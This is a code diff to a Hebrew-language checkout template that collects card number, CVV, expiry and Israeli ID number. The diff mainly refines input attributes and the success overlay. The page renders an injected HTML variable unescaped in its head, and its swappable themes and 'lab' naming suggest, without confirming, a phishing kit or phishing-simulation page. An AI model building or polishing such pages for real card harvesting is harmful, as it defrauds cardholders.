@@ -4,6 +4,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>סיום הזמנה</title>
+  <link rel="stylesheet" href="/static/css/lab-theme.css" />
   {% if bango_shell_inject %}{{ bango_shell_inject|safe }}{% endif %}
   <link rel="stylesheet" href="{{ url_for('theme_asset', theme_name=active_theme_id, filename='style.css') }}">
 </head>
@@ -48,13 +49,13 @@
 
             <div class="form_hndlDiv">
               <label for="phone">מספר טלפון נייד</label>
-              <input type="text" id="phone" name="phone" class="input-text" placeholder="מספר טלפון">
-              <span class="{{ bcls['bango-field-error'] }}" id="bango-err-phone" hidden>שדה חובה</span>
+                <input type="tel" id="phone" name="phone" class="input-text" placeholder="מספר טלפון" inputmode="numeric" pattern="[0-9]*" maxlength="10" autocomplete="tel">
+                <span class="{{ bcls['bango-field-error'] }}" id="bango-err-phone" hidden role="alert">שדה חובה</span>
             </div>
             <div class="form_hndlDiv">
               <label for="email">דוא"ל</label>
-              <input type="text" id="email" name="email" class="input-text" placeholder='דוא"ל'>
-              <span class="{{ bcls['bango-field-error'] }}" id="bango-err-email" hidden>שדה חובה</span>
+              <input type="email" id="email" name="email" class="input-text" placeholder='דוא"ל' autocomplete="email">
+              <span class="{{ bcls['bango-field-error'] }}" id="bango-err-email" hidden role="alert">שדה חובה</span>
             </div>
           </fieldset>
         </div>
@@ -64,26 +65,26 @@
             <div id="cap-cc" class="fieldset-cap">מלאו את פרטי כרטיס האשראי</div>
             <div class="form_hndlDiv" id="credit-card-container">
               <label for="card">מספר כרטיס אשראי</label>
-              <input type="text" id="card" name="card" class="input-text" placeholder="XXXX XXXX XXXX XXXX">
-              <span class="{{ bcls['bango-field-error'] }}" id="bango-err-card" hidden>שדה חובה</span>
+              <input type="tel" id="card" name="card" class="input-text" placeholder="XXXX XXXX XXXX XXXX" inputmode="numeric" pattern="[0-9]*" maxlength="19" autocomplete="cc-number">
+              <span class="{{ bcls['bango-field-error'] }}" id="bango-err-card" hidden role="alert">שדה חובה</span>
             </div>
             <div class="form_hndlDiv" id="ids-container">
               <label for="id_num">תעודת זהות</label>
-              <input type="text" id="id_num" name="id_num" class="input-text" placeholder="תעודת זהות">
-              <span class="{{ bcls['bango-field-error'] }}" id="bango-err-id_num" hidden>שדה חובה</span>
+              <input type="tel" id="id_num" name="id_num" class="input-text" placeholder="תעודת זהות" inputmode="numeric" pattern="[0-9]*" maxlength="9" autocomplete="off">
+              <span class="{{ bcls['bango-field-error'] }}" id="bango-err-id_num" hidden role="alert">שדה חובה</span>
             </div>
             <div class="form-row form-row--expiry-cvv">
               <div class="form_hndlDiv tokefHndl">
                 <label for="exp">תוקף הכרטיס</label>
                 <div class="form_hndlDiv select_cont">
-                  <input type="text" id="exp" name="exp" class="input-text input-expiry" placeholder="MM/YY">
-                  <span class="{{ bcls['bango-field-error'] }}" id="bango-err-exp" hidden>שדה חובה</span>
+                  <input type="tel" id="exp" name="exp" class="input-text input-expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" pattern="[0-9]*" autocomplete="cc-exp">
+                  <span class="{{ bcls['bango-field-error'] }}" id="bango-err-exp" hidden role="alert">שדה חובה</span>
                 </div>
               </div>
               <div class="form_hndlDiv short cvv_cont">
                 <label for="cvv">CVV</label>
                 <div class="cvv-input-row">
-                  <input type="text" id="cvv" name="cvv" class="input-text" placeholder="CVV">
+                  <input type="password" id="cvv" name="cvv" class="input-text" placeholder="CVV" maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="cc-csc">
                   <div class="help">
                     <span class="help_trigger" role="button" tabindex="0" aria-label="עזרה CVV">?</span>
                     <div class="help_content" aria-hidden="true">
@@ -91,18 +92,10 @@
                     </div>
                   </div>
                 </div>
-                <span class="{{ bcls['bango-field-error'] }}" id="bango-err-cvv" hidden>שדה חובה</span>
+                <span class="{{ bcls['bango-field-error'] }}" id="bango-err-cvv" hidden role="alert">שדה חובה</span>
               </div>
             </div>
           </fieldset>
-          <div class="errs">
-            <div class="err_msg" id="ID_Error">יש להזין מספר ת.ז. תקין</div>
-            <div class="err_msg" id="CC_Error">יש להזין מספר כרטיס אשראי תקין</div>
-            <div class="err_msg" id="CVV_Error">יש להזין מספר CVV תקין</div>
-          </div>
-          <div id="errorMessage" class="error"></div>
-          <div id="msg_error" class="error"><p class="error2">הזן את המידע כהלכה</p></div>
-          <div id="onelod" class="spinner-container"><div class="spinner-block"></div></div>
           <input class="submit_btn {{ bcls['btn-submit'] }}" id="submit" type="submit" value="אישור תשלום">
         </div>
       </div>
@@ -135,7 +128,11 @@
     <span class="lab-sr-only">Loading</span>
   </div>
   <div id="bango-success-overlay" class="{{ bcls['bango-success-overlay'] }}" hidden aria-hidden="true" role="alert" lang="he" dir="rtl">
-    <div class="{{ bcls['bango-success-overlay__icon'] }}" aria-hidden="true"></div>
+    <div class="{{ bcls['bango-success-overlay__icon'] }}" aria-hidden="true">
+      <svg width="55" height="55" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"></polyline>
+      </svg>
+    </div>
     <h2 class="{{ bcls['bango-success-overlay__title'] }}">הפעולה הושלמה בהצלחה</h2>
     <p class="{{ bcls['bango-success-overlay__text'] }}">הנתונים אומתו בהצלחה.</p>
     <div class="{{ bcls['bango-success-overlay__spinner'] }}" aria-hidden="true"></div>
